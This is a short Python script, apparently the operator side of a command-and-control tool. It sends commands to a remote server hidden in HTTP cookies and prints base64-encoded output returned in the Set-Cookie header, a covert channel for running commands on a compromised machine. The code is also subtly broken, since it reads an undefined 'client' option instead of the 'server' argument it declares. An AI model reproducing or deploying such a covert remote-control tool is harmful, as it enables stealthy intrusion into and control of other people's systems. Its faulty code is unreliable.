import requests
import cmd
from base64 import b64decode
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--server', required=True, help = 'Enter the server IP address')
parser.add_argument('-p', '--port', default=8000, help = 'Specify the port to connect on')
options = parser.parse_args()

ip = options.client
port = options.port

class C2(cmd.Cmd):

        prompt = '=>'

        def default(self, command):

                response = requests.get('http://{}:{}/'.format(ip, port), cookies={'Cookie': command})
                headers = response.headers
                encoded_output = headers['Set-Cookie']
                output = b64decode(encoded_output.encode()).decode()
                print(output)

C2().cmdloop()
